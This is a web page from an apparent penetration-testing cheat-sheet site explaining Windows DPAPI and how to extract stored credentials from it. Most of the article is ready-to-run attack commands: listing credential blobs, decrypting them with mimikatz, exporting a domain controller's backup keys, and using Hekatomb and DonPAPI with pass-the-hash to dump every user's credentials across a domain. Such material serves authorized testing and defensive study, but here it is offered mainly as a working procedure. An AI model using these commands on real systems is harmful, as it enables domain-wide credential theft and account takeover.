<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Methods for extracting Windows credentials from DPAPI AKA Microsoft Windows Data Protection API">
<meta name="theme-color" content="#FFFFFF">
<meta name="color-scheme" content="light dark"><meta property="og:title" content="Microsoft Window&#39;s Data Protection API" />
<meta property="og:description" content="Methods for extracting Windows credentials from DPAPI AKA Microsoft Windows Data Protection API" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/windows_dpapi/" /><meta property="article:section" content="docs" />
<meta property="article:published_time" content="2022-11-03T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-10T11:35:25-05:00" />
<title>Microsoft Window&#39;s Data Protection API | Gray Hat Freelancing</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.785c947877d58948262724960b7f142778965360cffc327852311c6a1bf73916.js" integrity="sha256-eFyUeHfViUgmJySWC38UJ3iWU2DP/DJ4UjEcahv3ORY=" crossorigin="anonymous"></script>

  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-5VH24CV5RY', { 'anonymize_ip': false });
}
</script>
<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
<script type="text/javascript" >
   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
   m[i].l=1*new Date();
   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

   ym(90832071, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
   });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/90832071" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894"
     crossorigin="anonymous"></script>
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/exercism_solutions/" class="">Exercism Solutions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/brute_force_cracking/" class="">Brute Force Cracking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/training_grounds/" class="">Training Grounds</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/wordpress/" class="">Wordpress Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_hardening/" class="">Windows - Hardening</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_amsi_bypass/" class="">Bypassing AMSI protections</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/subdomains_enumeration/" class="">Enumerating Subdomains</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_mimikatz/" class="">Windows - Mimikatz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_persistence/" class="">Windows - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_privilege_escalation/" class="">Windows - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_using_credentials/" class="">Windows - Using Credentials</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_download_and_execute/" class="">Windows Download and Execute Methods</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/escape_breakout/" class="">Application Escape and Breakout</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/office_attacks/" class="">Attacking Office</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/methodology_and_enumeration/" class="">Bug Hunting Methodology and Enumeration</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/hash_cracking/" class="">Hash Cracking Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_persistence/" class="">Linux - Persistence</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/linux_privilege_escalation/" class="">Linux - Privilege Escalation</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/metasploit_cheatsheet/" class="">Metasploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/windows_dpapi/" class="active">Microsoft Window&#39;s Data Protection API</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_discovery/" class="">Network Discovery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/network_pivoting_techniques/" class="">Network Pivoting Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/mssql_server_cheatsheet/" class="">Pentesting MSSQL Server Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/powershell_cheatsheet/" class="">Powershell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/reverse_shell_cheatsheet/" class="">Reverse Shell Cheatsheet</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/source_code_management/" class="">Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/miscellaneous_tricks/" class="">Miscellaneous Tips and Tricks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/graphql_injection/" class="">GraphQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csv_injection/" class="">Csv Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/command_injection/" class="">Command Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cors_misconfigurations/" class="">CORS Misconfigurations</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/dns_rebinding/" class="">DNS Rebinding</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/http_parameter_pollution/" class="">HTTP Parameter Pollution</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_deserialization/" class="">Insecure Deserialization</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_direct_object_references/" class="">Insecure Direct Object References</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_file_uploads/" class="">Insecure File Upload</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_management_interfaces/" class="">Insecure Management Interface</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/insecure_source_code_management/" class="">Insecure Source Code Management</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/java_rmi/" class="">Java RMI</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/json_web_token/" class="">JSON Web Tokens</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/kuburnetes/" class="">Kuburnetes</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/latex_injection/" class="">LaTeX Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/ldap_injection/" class="">LDAP Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/nosql_injection/" class="">NoSQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/oauth/" class="">OAuth</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/open_url_redirection/" class="">Open URL Redirection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/race_conditions/" class="">Race Conditions</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/request_smuggling/" class="">Request Smuggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/saml_injection/" class="">SAML Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_request_forgery/" class="">Server-Side Request Forgery</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/server_side_template_injection/" class="">Server-Side Template Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/sql_injection/" class="">SQL Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/tabnabbing/" class="">Tabnabbing</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/type_juggling/" class="">Type Juggling</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_cache_deception/" class="">Web Cache Deception</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/web_sockets/" class="">Web Sockets Attacks</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xxe_injection/" class="">XML eXternal Entity Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xslt_injection/" class="">XSLT Injection</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/xss_injection/" class="">XSS Injection</a>
  

        </li>
      
    
  </ul>











  
<ul>
  
  <li>
    <a href="/posts/"  >
        Blog
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
        Github
      </a>
  </li>
  
  <li>
    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
        Contribute
      </a>
  </li>
  
</ul>






</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>Microsoft Window&#39;s Data Protection API</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#windows---dpapi">Windows - DPAPI</a>
      <ul>
        <li><a href="#summary">Summary</a></li>
        <li><a href="#data-protection-api">Data Protection API</a>
          <ul>
            <li><a href="#list-credential-files">List Credential Files</a></li>
            <li><a href="#mimikatz---credential-manager--dpapi">Mimikatz - Credential Manager &amp; DPAPI</a></li>
            <li><a href="#hekatomb---steal-all-credentials-on-domain">Hekatomb - Steal all credentials on domain</a></li>
            <li><a href="#donpapi---dumping-dpapi-credz-remotely">DonPAPI - Dumping DPAPI credz remotely</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown"><h1 id="windows---dpapi">
  Windows - DPAPI
  <a class="anchor" href="#windows---dpapi">#</a>
</h1>
<blockquote>
<p>On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft&rsquo;s Data Protection API and stored as &ldquo;blob&rdquo; files in user AppData folder.</p>
</blockquote>
<h2 id="summary">
  Summary
  <a class="anchor" href="#summary">#</a>
</h2>
<ul>
<li><a href="#data-protection-api">Data Protection API</a>
<ul>
<li><a href="#list-credential-files">List Credential Files</a></li>
<li><a href="#mimikatz&#43;&#43;&#43;credential-manager--dpapi">Mimikatz - Credential Manager &amp; DPAPI</a></li>
<li><a href="#hekatomb&#43;&#43;&#43;steal-all-credentials-on-domain">Hekatomb - Steal all credentials on domain</a></li>
<li><a href="#donpapi&#43;&#43;&#43;dumping-dpapi-credz-remotely">DonPAPI - Dumping DPAPI credz remotely</a></li>
</ul>
</li>
</ul>
<h2 id="data-protection-api">
  Data Protection API
  <a class="anchor" href="#data-protection-api">#</a>
</h2>
<ul>
<li>Outside of a domain: the user&rsquo;s <code>password hash</code> is used to encrypt these &ldquo;blobs&rdquo;.</li>
<li>Inside a domain: the <code>domain controller's master key</code> is used to encrypt these blobs.</li>
</ul>
<p>With the extracted private key of the domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows identification manager of all the work<br>
stations in the domain.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>vaultcmd /list
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VaultCmd /listcreds<span style="color:#960050;background-color:#1e0010">:</span>&lt;namevault&gt;|&lt;guidvault&gt; /all
</span></span><span style="display:flex;"><span>vaultcmd /listcreds<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;Windows Credentials&#34;</span> /all
</span></span></code></pre></div><h3 id="list-credential-files">
  List Credential Files
  <a class="anchor" href="#list-credential-files">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
</span></span><span style="display:flex;"><span>dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
</span></span><span style="display:flex;"><span>Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
</span></span></code></pre></div><h3 id="mimikatz---credential-manager--dpapi">
  Mimikatz - Credential Manager &amp; DPAPI
  <a class="anchor" href="#mimikatz---credential-manager--dpapi">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># check the folder to find credentials</span>
</span></span><span style="display:flex;"><span>dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># check the file with mimikatz</span>
</span></span><span style="display:flex;"><span>mimikatz dpapi::cred /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
</span></span><span style="display:flex;"><span><span style="color:#75715e"># find master key</span>
</span></span><span style="display:flex;"><span>mimikatz !sekurlsa::dpapi
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use master key</span>
</span></span><span style="display:flex;"><span>mimikatz dpapi::cred /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey<span style="color:#960050;background-color:#1e0010">:</span>95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># find and export backup keys</span>
</span></span><span style="display:flex;"><span>lsadump::backupkeys /system<span style="color:#960050;background-color:#1e0010">:</span>dc01.lab.local /export
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use backup keys</span>
</span></span><span style="display:flex;"><span>dpapi::masterkey /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe&#34;</span> /pvk<span style="color:#960050;background-color:#1e0010">:</span>ntds_capi_0_d2685b31-<span style="color:#ae81ff">402d</span>-493b-8d12-5fe48ee26f5a.pvk
</span></span></code></pre></div><h3 id="hekatomb---steal-all-credentials-on-domain">
  Hekatomb - Steal all credentials on domain
  <a class="anchor" href="#hekatomb---steal-all-credentials-on-domain">#</a>
</h3>
<blockquote>
<p><a href="https://github.com/Processus-Thief/HEKATOMB">Processus-Thief/Hekatomb</a> is a python script that connects to LDAP directory to retrieve all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it will extract domain controller private key through RPC uses it to decrypt all credentials.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pip3 install hekatomb
</span></span><span style="display:flex;"><span>hekatomb <span style="color:#f92672">-</span>hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN<span style="color:#f92672">.</span>local<span style="color:#f92672">/</span>administrator<span style="color:#f92672">@</span><span style="color:#ae81ff">10.0.0.1</span> <span style="color:#f92672">-</span>debug <span style="color:#f92672">-</span>dnstcp
</span></span></code></pre></div><p><img src="https://github.com/Processus-Thief/HEKATOMB/raw/main/.assets/github1.png" alt="Data in memory" /></p>
<h3 id="donpapi---dumping-dpapi-credz-remotely">
  DonPAPI - Dumping DPAPI credz remotely
  <a class="anchor" href="#donpapi---dumping-dpapi-credz-remotely">#</a>
</h3>
<ul>
<li><a href="https://github.com/login-securite/DonPAPI">login-securite/DonPAPI</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>DonPAPI.py domain/user<span style="color:#960050;background-color:#1e0010">:</span>passw0rd@target
</span></span><span style="display:flex;"><span>DonPAPI.py --hashes &lt;LM&gt;<span style="color:#960050;background-color:#1e0010">:</span>&lt;NT&gt; domain/user@target
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># using domain backup key</span>
</span></span><span style="display:flex;"><span>dpapi.py backupkeys --export -t domain/user<span style="color:#960050;background-color:#1e0010">:</span>passw0rd@target_dc_ip
</span></span><span style="display:flex;"><span>python DonPAPI.py -pvk domain_backupkey.pvk domain/user<span style="color:#960050;background-color:#1e0010">:</span>passw0rd@domain_network_list
</span></span></code></pre></div><h2 id="references">
  References
  <a class="anchor" href="#references">#</a>
</h2>
<ul>
<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords">DPAPI - Extracting Passwords - HackTricks</a></li>
<li><a href="https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/">DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 4 MARS 2022</a></li>
</ul>
</article>
 
      

      <footer class="book-footer">
        
  <div class="flex flex-wrap justify-between">


  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d" title='Last modified by Stuart Gray | December 10, 2022' target="_blank" rel="noopener">
      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
      <span>December 10, 2022</span>
    </a>
  </div>




</div>



  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
 

      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    
    <aside class="book-toc">
      <div class="book-toc-content">
        
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#windows---dpapi">Windows - DPAPI</a>
      <ul>
        <li><a href="#summary">Summary</a></li>
        <li><a href="#data-protection-api">Data Protection API</a>
          <ul>
            <li><a href="#list-credential-files">List Credential Files</a></li>
            <li><a href="#mimikatz---credential-manager--dpapi">Mimikatz - Credential Manager &amp; DPAPI</a></li>
            <li><a href="#hekatomb---steal-all-credentials-on-domain">Hekatomb - Steal all credentials on domain</a></li>
            <li><a href="#donpapi---dumping-dpapi-credz-remotely">DonPAPI - Dumping DPAPI credz remotely</a></li>
          </ul>
        </li>
        <li><a href="#references">References</a></li>
      </ul>
    </li>
  </ul>
</nav>


 
      </div>
    </aside>
    
  </main>

  
</body>
</html>












